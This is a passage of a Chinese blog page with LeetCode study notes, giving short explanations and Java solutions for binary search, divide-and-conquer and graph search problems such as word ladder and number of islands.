class="number">0</span>, h = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt;= h) &#123;</span><br><span class="line">            <span class="keyword">int</span> m = l + (h - l) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (letters[m] &lt;= target) &#123;</span><br><span class="line">                l = m + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                h = m - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> l &lt; n ? letters[l] : letters[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-有序数组的-single-element"><a class="markdownIt-Anchor" href="#3-有序数组的-single-element"></a> 3. 有序数组的 Single Element</h3><p>  <a href="https://leetcode-cn.com/problems/single-element-in-a-sorted-array/submissions/">https://leetcode-cn.com/problems/single-element-in-a-sorted-array/submissions/</a></p><h4 id="思路-25"><a class="markdownIt-Anchor" href="#思路-25"></a> 思路</h4><p>  因为数组是有序的，所以一定是<code>11,22,33,4,55,66,77</code>这样成对出现，中间夹一个单。<br />  故用二分法进行查找，看mid值是与左相等还是与右相等。<br />  如果与左相等，判断从left到mid有多少数，因为要去除与mid相等的mid-1，故如果mid-left是偶数的话，则left<sub>mid-1是奇数，其中必然加载要寻找的数值，故`right=mid-2`，如果是奇数的话，说明从left</sub>mid-1是偶数，则要寻找的数值在另一侧，则<code>left=mid+1</code>。如果与右相等，则同理。如果左右都不等，则mid即为要寻找的数值。</p><h4 id="代码-23"><a class="markdownIt-Anchor" href="#代码-23"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">singleNonDuplicate</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left=<span class="number">0</span>,right=nums.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;right)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> mid=left+(right-left)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid]==nums[mid-<span class="number">1</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>((mid-left)%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">                    right=mid-<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    left=mid+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">if</span>(nums[mid]==nums[mid+<span class="number">1</span>])</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>((right-mid)%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">                        left=mid+<span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        right=mid-<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> nums[mid];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums[right];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-第一个错误的版本"><a class="markdownIt-Anchor" href="#4-第一个错误的版本"></a> 4. 第一个错误的版本</h3><p>  <a href="https://leetcode-cn.com/problems/first-bad-version/submissions/">https://leetcode-cn.com/problems/first-bad-version/submissions/</a></p><h4 id="思路-26"><a class="markdownIt-Anchor" href="#思路-26"></a> 思路</h4><p>  简单地二分查找，注意left和right的处理。</p><h4 id="代码-24"><a class="markdownIt-Anchor" href="#代码-24"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> <span class="keyword">extends</span> <span class="title">VersionControl</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">firstBadVersion</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left=<span class="number">0</span>,right=n;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;right)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> mid=left+(right-left)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(isBadVersion(mid))</span><br><span class="line">            &#123;</span><br><span class="line">                right=mid;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                left=mid+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> right;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-旋转数组的最小数字"><a class="markdownIt-Anchor" href="#5-旋转数组的最小数字"></a> 5. 旋转数组的最小数字</h3><p>  <a href="https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array/">https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array/</a></p><h4 id="思路-27"><a class="markdownIt-Anchor" href="#思路-27"></a> 思路</h4><p>  因为原来是有序的，旋转之后一定是要寻找的<code>N&lt;right&lt;left&lt;N-1</code> ，故如果mid比right大了，mid一定是在<code>left~N-1</code>这个区间，故缩减左边界；如果mid比right小，说明mid在<code>N~right</code>这个区间内，故缩减右边界。</p><h4 id="代码-25"><a class="markdownIt-Anchor" href="#代码-25"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, h = nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt; h) &#123;</span><br><span class="line">            <span class="keyword">int</span> m = l + (h - l) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (nums[m] &lt;= nums[h]) &#123;</span><br><span class="line">                h = m;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                l = m + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums[l];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-查找区间"><a class="markdownIt-Anchor" href="#6-查找区间"></a> 6. 查找区间</h3><p>  <a href="https://leetcode-cn.com/problems/find-first-and-last-position-of-element-in-sorted-array/">https://leetcode-cn.com/problems/find-first-and-last-position-of-element-in-sorted-array/</a></p><h4 id="思路-28"><a class="markdownIt-Anchor" href="#思路-28"></a> 思路</h4><p>  分两步来找左右边界，以target的第一次出现位置作为条件二分查找来获取左边界，以target+1来二分查找来获取右边界，其-1就是左边界。</p><h4 id="代码-26"><a class="markdownIt-Anchor" href="#代码-26"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] searchRange(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="keyword">int</span> first = binarySearch(nums, target);</span><br><span class="line">        <span class="keyword">int</span> last = binarySearch(nums, target + <span class="number">1</span>) - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (first == nums.length || nums[first] != target) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;first, Math.max(first, last)&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">binarySearch</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, h = nums.length;</span><br><span class="line">        <span class="keyword">while</span> (l &lt; h) &#123;</span><br><span class="line">            <span class="keyword">int</span> m = l + (h - l) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (nums[m] &gt;= target) &#123;</span><br><span class="line">                h = m;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                l = m + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> l;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="五-分治"><a class="markdownIt-Anchor" href="#五-分治"></a> 五、分治</h2><h3 id="1-给表达式加括号"><a class="markdownIt-Anchor" href="#1-给表达式加括号"></a> 1. 给表达式加括号</h3><p>  <a href="https://leetcode-cn.com/problems/different-ways-to-add-parentheses/">https://leetcode-cn.com/problems/different-ways-to-add-parentheses/</a></p><h4 id="思路-29"><a class="markdownIt-Anchor" href="#思路-29"></a> 思路</h4><p>  从左往右遍历每一个符号，在每一个符号处分开进行分制，相当于对符号左右两侧加括号。<br />  分治之后对于每个子串再遍历，从而完成每一种加括号的情况。</p><h4 id="代码-27"><a class="markdownIt-Anchor" href="#代码-27"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">diffWaysToCompute</span><span class="params">(String input)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; res=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;input.length();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> ch=input.charAt(i);</span><br><span class="line">            <span class="keyword">if</span>(ch==<span class="string">&#x27;+&#x27;</span>||ch==<span class="string">&#x27;-&#x27;</span>||ch==<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                List&lt;Integer&gt; left=diffWaysToCompute(input.substring(<span class="number">0</span>,i));</span><br><span class="line">                List&lt;Integer&gt; right=diffWaysToCompute(input.substring(i+<span class="number">1</span>));</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> li=<span class="number">0</span>;li&lt;left.size();li++)</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> ri=<span class="number">0</span>;ri&lt;right.size();ri++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span>(ch==<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">                            res.add(left.get(li)+right.get(ri));</span><br><span class="line">                        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">                            res.add(left.get(li)-right.get(ri));</span><br><span class="line">                        <span class="keyword">if</span>(ch==<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">                            res.add(left.get(li)*right.get(ri));</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(res.size()==<span class="number">0</span>)</span><br><span class="line">            res.add(Integer.parseInt(input));</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-不同的二叉搜索树"><a class="markdownIt-Anchor" href="#2-不同的二叉搜索树"></a> 2. 不同的二叉搜索树</h3><p>  <a href="https://leetcode-cn.com/problems/unique-binary-search-trees-ii/">https://leetcode-cn.com/problems/unique-binary-search-trees-ii/</a></p><h4 id="思路-30"><a class="markdownIt-Anchor" href="#思路-30"></a> 思路</h4><p>  对于连续整数序列[left, right]中的一点i，若要生成以i为根节点的BST，则有如下规律：<br />  i左边的序列可以作为左子树结点，i右边的序列可以作为右子树结点，所以左右分治，生成子树的所有情况，然后遍历，加上根节点构建当前树。</p><h4 id="代码-28"><a class="markdownIt-Anchor" href="#代码-28"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;TreeNode&gt; <span class="title">generateTrees</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        List&lt;TreeNode&gt; res=<span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        <span class="keyword">if</span>(n&lt;<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        <span class="keyword">return</span> generateSubtrees(<span class="number">1</span>,n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;TreeNode&gt; <span class="title">generateSubtrees</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> e)</span> </span>&#123;</span><br><span class="line">        List&lt;TreeNode&gt; res = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        <span class="keyword">if</span> (s &gt; e) &#123;</span><br><span class="line">            res.add(<span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = s; i &lt;= e; i++) &#123;</span><br><span class="line">            List&lt;TreeNode&gt; left = generateSubtrees(s, i - <span class="number">1</span>);</span><br><span class="line">            List&lt;TreeNode&gt; right = generateSubtrees(i + <span class="number">1</span>, e);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> li=<span class="number">0</span>;li&lt;left.size();li++)</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> ri=<span class="number">0</span>;ri&lt;right.size();ri++)</span><br><span class="line">                &#123;</span><br><span class="line">                    TreeNode root=<span class="keyword">new</span> TreeNode(i);</span><br><span class="line">                    root.left=left.get(li);</span><br><span class="line">                    root.right=right.get(ri);</span><br><span class="line">                    res.add(root);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="六-搜索"><a class="markdownIt-Anchor" href="#六-搜索"></a> 六、搜索</h2><h3 id="1-最短单词路径"><a class="markdownIt-Anchor" href="#1-最短单词路径"></a> 1. 最短单词路径</h3><p>  <a href="https://leetcode-cn.com/problems/word-ladder/">https://leetcode-cn.com/problems/word-ladder/</a></p><h4 id="思路-31"><a class="markdownIt-Anchor" href="#思路-31"></a> 思路</h4><p>  说实话，看题解思路看懂了，自己做还是没头绪。</p><ol><li>对给定的 wordList 做预处理，找出所有的通用状态。将通用状态记录在字典中，键是通用状态，值是所有具有通用状态的单词。</li><li>将包含 beginWord 和 1 的元组放入队列中，1 代表节点的层次。我们需要返回 endWord 的层次也就是从 beginWord 出发的最短距离。</li><li>为了防止出现环，使用访问数组记录。</li><li>当队列中有元素的时候，取出第一个元素，记为 current_word。</li><li>找到 current_word 的所有通用状态，并检查这些通用状态是否存在其它单词的映射，这一步通过检查 all_combo_dict 来实现。</li><li>从 all_combo_dict 获得的所有单词，都和 current_word 共有一个通用状态，所以都和 current_word 相连，因此将他们加入到队列中。</li><li>对于新获得的所有单词，向队列中加入元素 (word, level + 1) 其中 level 是 current_word 的层次。</li><li>最终当你到达期望的单词，对应的层次就是最短变换序列的长度。</li></ol><h4 id="代码-29"><a class="markdownIt-Anchor" href="#代码-29"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">ladderLength</span><span class="params">(String beginWord, String endWord, List&lt;String&gt; wordList)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Since all words are of same length.</span></span><br><span class="line">    <span class="keyword">int</span> L = beginWord.length();</span><br><span class="line">    <span class="comment">// Dictionary to hold combination of words that can be formed,</span></span><br><span class="line">    <span class="comment">// from any given word. By changing one letter at a time.</span></span><br><span class="line">    HashMap&lt;String, ArrayList&lt;String&gt;&gt; allComboDict = <span class="keyword">new</span> HashMap&lt;String, ArrayList&lt;String&gt;&gt;();</span><br><span class="line"></span><br><span class="line">    wordList.forEach(</span><br><span class="line">        word -&gt; &#123;</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; L; i++) &#123;</span><br><span class="line">            <span class="comment">// Key is the generic word</span></span><br><span class="line">            <span class="comment">// Value is a list of words which have the same intermediate generic word.</span></span><br><span class="line">            String newWord = word.substring(<span class="number">0</span>, i) + <span class="string">&#x27;*&#x27;</span> + word.substring(i + <span class="number">1</span>, L);</span><br><span class="line">            ArrayList&lt;String&gt; transformations =</span><br><span class="line">                allComboDict.getOrDefault(newWord, <span class="keyword">new</span> ArrayList&lt;String&gt;());</span><br><span class="line">            transformations.add(word);</span><br><span class="line">            allComboDict.put(newWord, transformations);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Queue for BFS</span></span><br><span class="line">    Queue&lt;Pair&lt;String, Integer&gt;&gt; Q = <span class="keyword">new</span> LinkedList&lt;Pair&lt;String, Integer&gt;&gt;();</span><br><span class="line">    Q.add(<span class="keyword">new</span> Pair(beginWord, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Visited to make sure we don&#x27;t repeat processing same word.</span></span><br><span class="line">    HashMap&lt;String, Boolean&gt; visited = <span class="keyword">new</span> HashMap&lt;String, Boolean&gt;();</span><br><span class="line">    visited.put(beginWord, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!Q.isEmpty()) &#123;</span><br><span class="line">      Pair&lt;String, Integer&gt; node = Q.remove();</span><br><span class="line">      String word = node.getKey();</span><br><span class="line">      <span class="keyword">int</span> level = node.getValue();</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; L; i++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Intermediate words for current word</span></span><br><span class="line">        String newWord = word.substring(<span class="number">0</span>, i) + <span class="string">&#x27;*&#x27;</span> + word.substring(i + <span class="number">1</span>, L);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Next states are all the words which share the same intermediate state.</span></span><br><span class="line">        <span class="keyword">for</span> (String adjacentWord : allComboDict.getOrDefault(newWord, <span class="keyword">new</span> ArrayList&lt;String&gt;())) &#123;</span><br><span class="line">          <span class="comment">// If at any point if we find what we are looking for</span></span><br><span class="line">          <span class="comment">// i.e. the end word - we can return with the answer.</span></span><br><span class="line">          <span class="keyword">if</span> (adjacentWord.equals(endWord)) &#123;</span><br><span class="line">            <span class="keyword">return</span> level + <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// Otherwise, add it to the BFS Queue. Also mark it visited</span></span><br><span class="line">          <span class="keyword">if</span> (!visited.containsKey(adjacentWord)) &#123;</span><br><span class="line">            visited.put(adjacentWord, <span class="keyword">true</span>);</span><br><span class="line">            Q.add(<span class="keyword">new</span> Pair(adjacentWord, level + <span class="number">1</span>));</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-查找最大的连通面积"><a class="markdownIt-Anchor" href="#2-查找最大的连通面积"></a> 2. 查找最大的连通面积</h3><p>  <a href="https://leetcode-cn.com/problems/max-area-of-island/">https://leetcode-cn.com/problems/max-area-of-island/</a></p><h4 id="思路-32"><a class="markdownIt-Anchor" href="#思路-32"></a> 思路</h4><p>  遍历所有节点，从当前节点出发上下左右开始寻找所有连同的1，来寻找最大值。已经查找过得点可以置为0，以免再次查找。</p><h4 id="代码-30"><a class="markdownIt-Anchor" href="#代码-30"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> m, n;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[][] direction = &#123;&#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">0</span>, -<span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;-<span class="number">1</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxAreaOfIsland</span><span class="params">(<span class="keyword">int</span>[][] grid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (grid == <span class="keyword">null</span> || grid.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        m = grid.length;</span><br><span class="line">        n = grid[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">int</span> maxArea = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                maxArea = Math.max(maxArea, dfs(grid, i, j));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxArea;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span>[][] grid, <span class="keyword">int</span> r, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (r &lt; <span class="number">0</span> || r &gt;= m || c &lt; <span class="number">0</span> || c &gt;= n || grid[r][c] == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        grid[r][c] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> area = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span>[] d : direction) &#123;</span><br><span class="line">            area += dfs(grid, r + d[<span class="number">0</span>], c + d[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> area;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-矩阵中的连通分量数目"><a class="markdownIt-Anchor" href="#3-矩阵中的连通分量数目"></a> 3. 矩阵中的连通分量数目</h3><p>  <a href="https://leetcode-cn.com/problems/number-of-islands/">https://leetcode-cn.com/problems/number-of-islands/</a></p><h4 id="思路-33"><a class="markdownIt-Anchor" href="#思路-33"></a> 思路</h4><p>  与上题基本一样。</p><h4 id="代码-31"><a class="markdownIt-Anchor" href="#代码-31"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> m, n;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[][] direction = &#123;&#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">0</span>, -<span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;-<span class="number">1</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numIslands</span><span class="params">(<span class="keyword">char</span>[][] grid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (grid == <span class="keyword">null</span> || grid.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        m = grid.length;</span><br><span class="line">        n = grid[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">int</span> islandsNum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] != <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">                    dfs(grid, i, j);</span><br><span class="line">                    islandsNum++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> islandsNum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">char</span>[][] grid, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= m || j &lt; <span class="number">0</span> || j &gt;= n || grid[i][j] == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        grid[i][j] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span>[] d : direction) &#123;</span><br><span class="line">            dfs(grid, i + d[<span class="number">0</span>], j + d[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-好友关系的连通分量数目"><a class="markdownIt-Anchor" href="#4-好友关系的连通分量数目"></a> 4. 好友关系的连通分量数目</h3><p>  <a href="https://leetcode-cn.com/problems/friend-circles/">https://leetcode-cn.com/problems/friend-circles/</a></p><h4 id="思路-34"><a class="markdownIt-Anchor" href="#思路-34"></a> 思路</h4><p>  由于两个人互为好友，这个图一定是对角线对称的，我们可以从每个人出发遍历其朋友圈进行DFS，对于通过DFS遍历查找过得人，可以用一个标记数组来标记。</p><h4 id="代码-32"><a class="markdownIt-Anchor" href="#代码-32"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findCircleNum</span><span class="params">(<span class="keyword">int</span>[][] M)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span>[] visited = <span class="keyword">new</span> <span class="keyword">boolean</span>[M.length];</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; M.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!visited[i]) &#123;</span><br><span class="line">                dfs(M, visited, i);</span><br><span class="line">                ret++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span>[][] m, <span class="keyword">boolean</span>[] visited, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m.length; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span>(m[i][j] == <span class="number">1</span> &amp;&amp; !visited[j]) &#123;</span><br><span class="line">                visited[j] = <span class="keyword">true</span>;</span><br><span class="line">                dfs(m, visited, j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-填充封闭区域"><a class="markdownIt-Anchor" href="#5-填充封闭区域"></a> 5. 填充封闭区域</h3><p>  <a href="https://leetcode-cn.com/problems/surrounded-regions/">https://leetcode-cn.com/problems/surrounded-regions/</a></p><h4 id="思路-35"><a class="markdownIt-Anchor" href="#思路-35"></a> 思路</h4><p>  先遍历上下左右边界，把所有连通的<code>O</code>用<code>N</code>来代替，然后遍历整个数组，把<code>N</code>换位<code>O</code>，把<code>O</code>换为<code>X</code>即可。</p><h4 id="代码-33"><a class="markdownIt-Anchor" href="#代码-33"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[][] direction = &#123;&#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">0</span>, -<span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span 